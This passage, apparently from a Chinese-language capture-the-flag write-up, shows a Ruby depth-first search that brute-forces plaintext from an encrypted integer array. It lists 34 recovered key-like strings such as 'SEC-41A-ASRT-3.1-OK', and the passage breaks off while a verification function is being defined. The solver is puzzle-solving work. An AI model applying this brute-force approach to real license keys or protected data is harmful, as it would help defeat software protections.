</span><span class='line'>  <span class="o">-</span><span class="mi">178</span><span class="p">,</span> <span class="o">-</span><span class="mi">189</span><span class="p">,</span> <span class="o">-</span><span class="mi">255</span><span class="p">,</span> <span class="o">-</span><span class="mi">256</span><span class="p">,</span> <span class="o">-</span><span class="mi">193</span><span class="p">,</span> <span class="o">-</span><span class="mi">257</span><span class="p">,</span> <span class="o">-</span><span class="mi">235</span><span class="p">,</span> <span class="o">-</span><span class="mi">159</span><span class="p">,</span> <span class="o">-</span><span class="mi">198</span><span class="p">,</span> <span class="o">-</span><span class="mi">227</span><span class="p">,</span>
</span><span class='line'>  <span class="o">-</span><span class="mi">187</span><span class="p">,</span> <span class="o">-</span><span class="mi">187</span><span class="p">,</span> <span class="o">-</span><span class="mi">267</span><span class="p">,</span> <span class="o">-</span><span class="mi">221</span><span class="p">,</span> <span class="o">-</span><span class="mi">225</span><span class="p">,</span> <span class="o">-</span><span class="mi">228</span><span class="p">,</span> <span class="o">-</span><span class="mi">235</span><span class="p">,</span> <span class="o">-</span><span class="mi">249</span><span class="p">,</span> <span class="o">-</span><span class="mi">259</span><span class="p">,</span> <span class="o">-</span><span class="mi">287</span><span class="p">,</span>
</span><span class='line'>  <span class="o">-</span><span class="mi">230</span><span class="p">,</span> <span class="o">-</span><span class="mi">190</span><span class="p">,</span> <span class="o">-</span><span class="mi">196</span><span class="p">,</span> <span class="o">-</span><span class="mi">218</span><span class="p">,</span> <span class="o">-</span><span class="mi">269</span><span class="p">,</span> <span class="o">-</span><span class="mi">230</span><span class="p">,</span> <span class="o">-</span><span class="mi">259</span><span class="p">,</span> <span class="o">-</span><span class="mi">239</span><span class="p">,</span> <span class="o">-</span><span class="mi">221</span><span class="p">,</span> <span class="o">-</span><span class="mi">205</span><span class="p">,</span>
</span><span class='line'>  <span class="o">-</span><span class="mi">233</span><span class="p">,</span> <span class="o">-</span><span class="mi">253</span><span class="p">,</span> <span class="o">-</span><span class="mi">221</span><span class="p">,</span> <span class="o">-</span><span class="mi">228</span><span class="p">,</span> <span class="o">-</span><span class="mi">194</span><span class="p">,</span> <span class="o">-</span><span class="mi">312</span><span class="p">,</span> <span class="o">-</span><span class="mi">258</span><span class="p">,</span> <span class="o">-</span><span class="mi">120</span><span class="p">,</span> <span class="o">-</span><span class="mi">214</span><span class="p">,</span> <span class="o">-</span><span class="mi">269</span><span class="p">,</span>
</span><span class='line'>  <span class="o">-</span><span class="mi">255</span><span class="p">,</span> <span class="o">-</span><span class="mi">186</span><span class="p">,</span> <span class="o">-</span><span class="mi">215</span><span class="p">,</span> <span class="o">-</span><span class="mi">258</span><span class="p">,</span> <span class="o">-</span><span class="mi">252</span><span class="p">,</span> <span class="o">-</span><span class="mi">229</span><span class="p">,</span> <span class="o">-</span><span class="mi">234</span><span class="p">,</span> <span class="o">-</span><span class="mi">289</span><span class="p">,</span> <span class="o">-</span><span class="mi">215</span><span class="p">,</span> <span class="o">-</span><span class="mi">229</span><span class="p">,</span>
</span><span class='line'>  <span class="o">-</span><span class="mi">144</span><span class="p">,</span> <span class="o">-</span><span class="mi">199</span><span class="p">,</span> <span class="o">-</span><span class="mi">247</span><span class="p">,</span> <span class="o">-</span><span class="mi">174</span><span class="p">,</span> <span class="o">-</span><span class="mi">291</span><span class="p">,</span> <span class="o">-</span><span class="mi">202</span><span class="p">,</span> <span class="o">-</span><span class="mi">307</span><span class="p">,</span> <span class="o">-</span><span class="mi">195</span><span class="p">,</span> <span class="o">-</span><span class="mi">197</span><span class="p">,</span> <span class="o">-</span><span class="mi">237</span><span class="p">,</span>
</span><span class='line'>  <span class="o">-</span><span class="mi">264</span><span class="p">,</span> <span class="o">-</span><span class="mi">173</span><span class="p">,</span> <span class="o">-</span><span class="mi">197</span><span class="p">,</span> <span class="o">-</span><span class="mi">249</span><span class="p">,</span> <span class="o">-</span><span class="mi">290</span><span class="p">,</span> <span class="o">-</span><span class="mi">226</span><span class="p">,</span> <span class="o">-</span><span class="mi">225</span><span class="p">,</span> <span class="o">-</span><span class="mi">204</span><span class="p">,</span> <span class="o">-</span><span class="mi">238</span><span class="p">,</span> <span class="o">-</span><span class="mi">244</span><span class="p">,</span>
</span><span class='line'>  <span class="o">-</span><span class="mi">201</span><span class="p">,</span> <span class="o">-</span><span class="mi">152</span><span class="p">,</span> <span class="o">-</span><span class="mi">270</span><span class="p">,</span> <span class="o">-</span><span class="mi">244</span><span class="p">,</span> <span class="o">-</span><span class="mi">263</span><span class="p">,</span> <span class="o">-</span><span class="mi">155</span><span class="p">,</span> <span class="o">-</span><span class="mi">253</span><span class="p">,</span> <span class="o">-</span><span class="mi">229</span><span class="p">,</span> <span class="o">-</span><span class="mi">247</span><span class="p">,</span> <span class="o">-</span><span class="mi">319</span><span class="p">,</span>
</span><span class='line'>  <span class="o">-</span><span class="mi">229</span><span class="p">,</span> <span class="o">-</span><span class="mi">272</span><span class="p">,</span> <span class="o">-</span><span class="mi">264</span><span class="p">,</span> <span class="o">-</span><span class="mi">280</span><span class="p">,</span> <span class="o">-</span><span class="mi">188</span><span class="p">,</span> <span class="o">-</span><span class="mi">203</span><span class="p">,</span> <span class="o">-</span><span class="mi">259</span><span class="p">,</span> <span class="o">-</span><span class="mi">258</span><span class="p">,</span> <span class="o">-</span><span class="mi">261</span><span class="p">,</span> <span class="o">-</span><span class="mi">195</span><span class="p">,</span>
</span><span class='line'>  <span class="o">-</span><span class="mi">257</span><span class="p">,</span> <span class="o">-</span><span class="mi">166</span><span class="p">,</span> <span class="o">-</span><span class="mi">231</span><span class="p">,</span> <span class="o">-</span><span class="mi">207</span><span class="p">,</span> <span class="o">-</span><span class="mi">281</span><span class="p">,</span> <span class="o">-</span><span class="mi">191</span><span class="p">,</span> <span class="o">-</span><span class="mi">234</span><span class="p">,</span> <span class="o">-</span><span class="mi">210</span><span class="p">,</span> <span class="o">-</span><span class="mi">187</span><span class="p">,</span> <span class="o">-</span><span class="mi">309</span><span class="p">,</span>
</span><span class='line'>  <span class="o">-</span><span class="mi">170</span><span class="p">,</span> <span class="o">-</span><span class="mi">172</span><span class="p">,</span> <span class="o">-</span><span class="mi">239</span><span class="p">,</span> <span class="o">-</span><span class="mi">225</span><span class="p">,</span> <span class="o">-</span><span class="mi">195</span><span class="p">,</span> <span class="o">-</span><span class="mi">238</span><span class="p">,</span> <span class="o">-</span><span class="mi">265</span><span class="p">,</span> <span class="o">-</span><span class="mi">260</span><span class="p">,</span> <span class="o">-</span><span class="mi">291</span><span class="p">,</span> <span class="o">-</span><span class="mi">185</span><span class="p">,</span>
</span><span class='line'>  <span class="o">-</span><span class="mi">196</span><span class="p">,</span> <span class="o">-</span><span class="mi">191</span><span class="p">,</span> <span class="o">-</span><span class="mi">216</span><span class="p">,</span> <span class="o">-</span><span class="mi">225</span><span class="p">,</span> <span class="o">-</span><span class="mi">237</span><span class="p">,</span> <span class="o">-</span><span class="mi">248</span><span class="p">,</span> <span class="o">-</span><span class="mi">222</span><span class="p">,</span> <span class="o">-</span><span class="mi">167</span><span class="p">,</span> <span class="o">-</span><span class="mi">240</span><span class="p">,</span> <span class="o">-</span><span class="mi">269</span><span class="p">,</span>
</span><span class='line'>  <span class="o">-</span><span class="mi">205</span><span class="p">,</span> <span class="o">-</span><span class="mi">172</span><span class="p">,</span> <span class="o">-</span><span class="mi">208</span><span class="p">,</span> <span class="o">-</span><span class="mi">235</span><span class="p">,</span> <span class="o">-</span><span class="mi">235</span><span class="p">,</span> <span class="o">-</span><span class="mi">223</span><span class="p">,</span> <span class="o">-</span><span class="mi">201</span><span class="p">,</span> <span class="o">-</span><span class="mi">254</span><span class="p">,</span> <span class="o">-</span><span class="mi">229</span><span class="p">,</span> <span class="o">-</span><span class="mi">230</span><span class="p">,</span>
</span><span class='line'>  <span class="o">-</span><span class="mi">209</span><span class="p">,</span> <span class="o">-</span><span class="mi">265</span><span class="p">,</span> <span class="o">-</span><span class="mi">312</span><span class="p">,</span> <span class="o">-</span><span class="mi">240</span><span class="p">,</span> <span class="o">-</span><span class="mi">201</span><span class="p">,</span> <span class="o">-</span><span class="mi">274</span><span class="p">,</span> <span class="o">-</span><span class="mi">258</span><span class="p">,</span> <span class="o">-</span><span class="mi">180</span><span class="p">,</span> <span class="o">-</span><span class="mi">223</span><span class="p">,</span> <span class="o">-</span><span class="mi">250</span><span class="p">,</span>
</span><span class='line'><span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">dfs</span><span class="p">(</span><span class="n">plain</span><span class="p">,</span> <span class="n">enc</span><span class="p">)</span>
</span><span class='line'>  <span class="n">round</span> <span class="o">=</span> <span class="n">plain</span><span class="o">.</span><span class="n">length</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">round</span> <span class="o">&gt;</span> <span class="mi">39</span>
</span><span class='line'>    <span class="nb">p</span> <span class="n">plain</span>
</span><span class='line'>    <span class="k">return</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">round</span> <span class="sx">%= 20</span>
</span><span class='line'><span class="sx">  if round =</span><span class="o">=</span> <span class="mi">3</span> <span class="o">||</span> <span class="n">round</span> <span class="o">==</span> <span class="mi">7</span> <span class="o">||</span> <span class="n">round</span> <span class="o">==</span> <span class="mi">12</span> <span class="o">||</span> <span class="n">round</span> <span class="o">==</span> <span class="mi">16</span>
</span><span class='line'>    <span class="n">chars</span> <span class="o">=</span> <span class="o">[</span> <span class="s2">&quot;-&quot;</span> <span class="o">]</span>
</span><span class='line'>  <span class="k">elsif</span> <span class="n">round</span> <span class="o">&gt;=</span> <span class="mi">8</span> <span class="o">&amp;&amp;</span> <span class="n">round</span> <span class="o">&lt;=</span> <span class="mi">11</span>
</span><span class='line'>    <span class="n">s</span> <span class="o">=</span> <span class="s2">&quot;ASRT&quot;</span>
</span><span class='line'>    <span class="n">chars</span> <span class="o">=</span> <span class="o">[</span> <span class="n">s</span><span class="o">[</span><span class="n">round</span> <span class="o">-</span> <span class="mi">8</span><span class="o">]</span> <span class="o">]</span>
</span><span class='line'>  <span class="k">elsif</span> <span class="n">round</span> <span class="o">==</span> <span class="mi">14</span>
</span><span class='line'>    <span class="n">chars</span> <span class="o">=</span> <span class="o">[</span> <span class="s2">&quot;.&quot;</span> <span class="o">]</span>
</span><span class='line'>  <span class="k">elsif</span> <span class="n">round</span> <span class="o">==</span> <span class="mi">13</span> <span class="o">||</span> <span class="n">round</span> <span class="o">==</span> <span class="mi">15</span>
</span><span class='line'>    <span class="n">chars</span> <span class="o">=</span> <span class="o">[]</span>
</span><span class='line'>    <span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="n">.</span><span class="s1">&#39;9&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">each</span> <span class="p">{</span> <span class="o">|</span><span class="n">c</span><span class="o">|</span> <span class="n">chars</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="p">}</span>
</span><span class='line'>  <span class="k">elsif</span> <span class="n">round</span> <span class="o">==</span> <span class="mi">19</span>
</span><span class='line'>    <span class="n">chars</span> <span class="o">=</span> <span class="o">[</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">]</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="n">chars</span> <span class="o">=</span> <span class="o">[]</span>
</span><span class='line'>    <span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="n">.</span><span class="s1">&#39;9&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">each</span> <span class="p">{</span> <span class="o">|</span><span class="n">c</span><span class="o">|</span> <span class="n">chars</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="p">}</span>
</span><span class='line'>    <span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">.</span><span class="n">.</span><span class="s1">&#39;Z&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">each</span> <span class="p">{</span> <span class="o">|</span><span class="n">c</span><span class="o">|</span> <span class="n">chars</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="p">}</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>  <span class="n">chars</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">c</span><span class="o">|</span>
</span><span class='line'>    <span class="n">plain</span> <span class="o">=</span> <span class="n">plain</span> <span class="o">+</span> <span class="n">c</span>
</span><span class='line'>    <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="n">.</span><span class="mi">15</span><span class="p">)</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">i</span><span class="o">|</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">brute_es</span><span class="p">(</span><span class="n">plain</span><span class="p">,</span> <span class="n">enc</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
</span><span class='line'>        <span class="n">dfs</span><span class="p">(</span><span class="n">plain</span><span class="p">,</span> <span class="n">enc</span><span class="p">)</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="n">plain</span> <span class="o">=</span> <span class="n">plain</span><span class="o">[</span><span class="mi">0</span><span class="o">.</span><span class="n">.</span><span class="o">-</span><span class="mi">2</span><span class="o">]</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">dfs</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">enc</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>一共會跑出 34 組，看到 <code>SEC-</code> 和 <code>KOR-</code> 就覺得應該沒解錯，不過直接用 ruby 跑其實有點久，有時間再來看一下怎麼加速 XD</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>$ time ruby solve.rb
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-J1\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-J2\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-KD\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-KE\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-KJ\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-KM\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-KN\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-KO\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-L0\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-L2\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-MR\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-MX\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-N5\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-NB\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-NC\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-ND\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-PT\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-PY\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-Q0\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-Q1\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-Q2\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-Q3\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-RX\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-SN\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-SQ\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-SR\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-SU\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-T7\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-TE\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-UP\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-UU\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-W0\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-W6\n&quot;
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-W8\n&quot;
</span><span class='line'>
</span><span class='line'>real    92m16.033s
</span><span class='line'>user    92m12.464s
</span><span class='line'>sys     0m3.675s
</span></code></pre></td></tr></table></div></figure>


<p>接下來就對這幾組，看他們的 <code>hash</code> 和 <code>sum == all(hash)</code> 了</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">plains</span> <span class="o">=</span> <span class="o">[</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-J1</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-J2</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-KD</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-KE</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-KJ</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-KM</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-KN</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-KO</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-L0</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-L2</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-MR</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-MX</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-N5</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-NB</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-NC</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-ND</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-PT</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-PY</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-Q0</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-Q1</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-Q2</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-Q3</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-RX</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-SN</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-SQ</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-SR</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-SU</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-T7</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-TE</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-UP</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-UU</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-W0</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-W6</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;SEC-41A-ASRT-3.1-OK</span><span class="se">\n</span><span class="s2">KOR-A43-ASRT-9.3-W8</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'><span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">rev_es</span><span class="p">(</span><span class="n">plain</span><span class="p">,</span> <span class="n">enc</span><span class="p">,</span> <span class="n">start</span><span class="p">)</span>
</span><span class='line'>  <span class="nb">hash</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
</span><span class='line'>  <span class="nb">hash</span> <span class="o">+=</span> <span class="n">start</span><span class="o">.</span><span class="n">to_s</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">first_sum</span> <span class="o">=</span> <span class="n">plain</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="n">ord</span> <span class="o">+</span> <span class="n">start</span> <span class="o">-</span> <span class="n">enc</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
</span><span class='line'>  <span class="n">sum</span> <span class="o">=</span> <span class="n">first_sum</span><span class="p">;</span>
